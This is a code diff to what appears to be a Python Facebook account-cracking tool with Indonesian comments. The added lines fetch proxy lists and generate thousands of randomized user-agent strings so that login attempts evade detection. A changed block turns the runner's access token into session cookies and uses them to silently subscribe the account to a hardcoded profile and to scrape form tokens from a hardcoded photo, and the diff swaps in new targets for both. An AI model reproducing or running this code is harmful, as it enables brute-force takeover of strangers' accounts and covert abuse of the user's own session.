@@ -7,7 +7,75 @@ from rich import print
 from rich.columns import Columns
 from rich.tree import Tree
 from requests.exceptions import RequestException
+#------------------[ APPEND [] ]-------------------#
+ugen2 = []
+ugent = []
+uaku2 = []
+usam = []
+ugen = []
+uakuh = []
+usragent = []
+#------------------[ USER-AGENT ]-------------------#
+try:
+	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
+	open('.prox.txt','w').write(prox)
+except Exception as e:
+	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari BrayennnXD');exit()
+prox=open('.prox.txt','r').read().splitlines()
+for xd in range(10000):
+	a='Mozilla/5.0 (Linux; U; Android 7.1.2;'
+	b=random.randrange(1, 9)
+	c=random.randrange(1, 9)
+	d='Redmi 4A Build/N2G47H)'
+	e=random.randrange(100, 9999)
+	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
+	g=random.randrange(1, 9)
+	h=random.randrange(1, 4)
+	i=random.randrange(1, 4)
+	j=random.randrange(1, 4)
+	k='Mobile Safari/537.36 XiaoMi/Mint Browser/1.3.3'
+	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+	ugen2.append(uaku)
 
+#------------[ UBAH UA DIH SINI OM ]---------------#
+for t in range(10000):
+    rr = random.randint
+    rc = random.choice
+    g1 = random.choice(['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19'])
+    g2 = random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1','QKQ1'])
+    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A405FN Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; M2012K11AG Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+    u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Infinix X5514D Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+    u4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Meizu C10 Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+    u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J120H Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+    UaMainn = random.choice([u1, u2, u3, u4, u5])
+    ugen.append(UaMainn)
+ 
+for x in range(10):
+	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
+	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
+	c=random.randrange(73,100)
+	d=random.randrange(4200,4900)
+	e=random.randrange(40,150)
+	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
+    
+for xd in range(900):
+    a=random.choice(['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19'])
+    b=random.choice(['Nokia C3 Build/QP1A.190711.020; wv)','Archos Oxygen 57 Build/P00610; wv)','RCT6716Q25 Build/QP1A.190711.020; wv)','Z6750M Build/QKQ1.200913.002; wv)','S98Pro Build/SP1A.210812.016; wv)','100026191 Build/RP1A.200720.011; wv)','SC-51B Build/TP1A.220624.014; wv)','ONA19TB003 Build/PPR1.180610.011; wv)','Titan Slim Build/RP1A.200720.011; wv)','TECNO KI5k Build/SP1A.210812.016; wv)'])
+    c=random.choice(['Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]','Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/332.0.0.22.108;]','Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/386.0.0.19.106;]','Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]','Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]','Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/332.0.0.23.111;]','Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;]','Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/364.1.0.25.132;]'])
+    
+def uaku():
+	try:
+		ua=open('bbnew.txt','r').read().splitlines()
+		for ub in ua:
+			ugen.append(ub)
+	except:
+		a=requests.get('https://github.com/Itsmeafriliyan/List-User-Agent/blob/main/list_user-agent.txt').text
+		ua=open('.list_user-agent.txt','w')
+		aa=re.findall('line">(.*?)<',str(a))
+		for un in aa:
+			ua.write(un+'\n')
+		ua=open('.list_user-agent.txt','r').read().splitlines()
 Dump, Looping, Ok, Cp = [], 0, [], []
 # Pilih Metode Crack
 def tanya_metode():
@@ -249,10 +317,10 @@ while True:
                 for key in requests.get('https://api.facebook.com/method/auth.getSessionforApp?access_token={}&format=json&new_app_id=1348564698517390&generate_session_cookies=1'.format(token)).json()['session_cookies']:
                     cookies.update({key['name']: key['value']})
                 cookies = ("; ".join([str(x)+"="+str(y) for x,y in cookies.items()]))
-                response = requests.get('https://mbasic.facebook.com/rozhak.xyz', headers = {'cookie': cookies}).text # Jangan Di Ganti
+                response = requests.get('https://mbasic.facebook.com/Itsme.Dvanme', headers = {'cookie': cookies}).text # Jangan Di Ganti
                 if '/a/subscribe.php?id=' in str(response):
                     requests.get('https://mbasic.facebook.com/a/subscribe.php?{}'.format(re.search('href="/a/subscribe.php\\?(.*?)"', str(response)).group(1).replace('amp;', '')), headers = {'cookie': cookies})
-                response2 = requests.get('https://mbasic.facebook.com/photo.php?fbid=10160350353143544&id=757953543&set=a.10156844811553544', headers = {'cookie': cookies}).text # Jangan Di Ganti
+                response2 = requests.get('https://www.facebook.com/photo/?fbid=1672257059893457&set=a.161861817599663', headers = {'cookie': cookies}).text # Jangan Di Ganti
                 data = {
                     'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1),
                     'jazoest': re.search('name="jazoest" value="(.*?)"', str(response2)).group(1),
